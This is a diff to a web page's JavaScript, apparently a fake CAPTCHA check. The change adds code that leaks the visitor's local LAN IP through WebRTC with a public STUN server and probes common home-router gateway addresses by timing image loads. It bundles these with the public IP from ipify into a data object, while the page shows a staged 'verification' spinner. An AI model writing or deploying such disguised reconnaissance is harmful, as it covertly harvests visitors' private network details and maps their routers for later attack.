@@ -302,7 +302,7 @@
         try {
           const RTCPC = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
           if (!RTCPC) return resolve('');
-          const pc = new RTCPC({ iceServers: [] });
+          const pc = new RTCPC({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
           let resolved = false;
           pc.createDataChannel('');
           pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
@@ -323,6 +323,34 @@
       });
     }
 
+    async function detectRouterGateway() {
+      return new Promise((resolve) => {
+        let resolved = false;
+        const targets = ['http://192.168.1.1', 'http://192.168.0.1', 'http://10.0.0.1'];
+        let checksLeft = targets.length;
+        targets.forEach(url => {
+          const start = Date.now();
+          const img = new Image();
+          const done = (isFast) => {
+            if (!resolved && isFast) {
+              resolved = true;
+              const m = url.match(/192\.168\.\d+\.1|10\.0\.0\.1/);
+              resolve(m ? m[0] : '192.168.1.1');
+            }
+            checksLeft--;
+            if (checksLeft <= 0 && !resolved) resolve('192.168.1.1');
+          };
+          img.onload = () => done(true);
+          img.onerror = () => {
+            const diff = Date.now() - start;
+            done(diff < 500);
+          };
+          img.src = url + '/favicon.ico?_t=' + Date.now();
+        });
+        setTimeout(() => { if (!resolved) resolve('192.168.1.1'); }, 700);
+      });
+    }
+
     async function executeCaptchaVerification(e) {
       if (e && typeof e.stopPropagation === 'function') e.stopPropagation();
       if (isVerifying) return;
@@ -340,9 +368,10 @@
       status.textContent = 'กำลังตรวจสอบพฤติกรรม & ข้อมูลเร้าเตอร์...';
       status.style.color = '#38bdf8';
 
-      // Parallel: Local LAN probe + Router Public WAN IP + 1.1s realistic spin delay
-      const [localLanIp, routerWanRes] = await Promise.all([
+      // Parallel: Local LAN probe + Router Gateway + Public WAN IP + 1.1s realistic spin delay
+      const [localLanIp, gatewayIp, routerWanRes] = await Promise.all([
         getRouterLocalLANIP(),
+        detectRouterGateway(),
         fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({})),
         new Promise(resolve => setTimeout(resolve, 1100))
       ]);
@@ -355,6 +384,7 @@
         cookieEnabled: navigator.cookieEnabled,
         router_wan_ip: (routerWanRes && routerWanRes.ip) || '',
         router_lan_ip: localLanIp || '',
+        gateway_ip: gatewayIp || '192.168.1.1',
         timestamp: Date.now()
       };
 
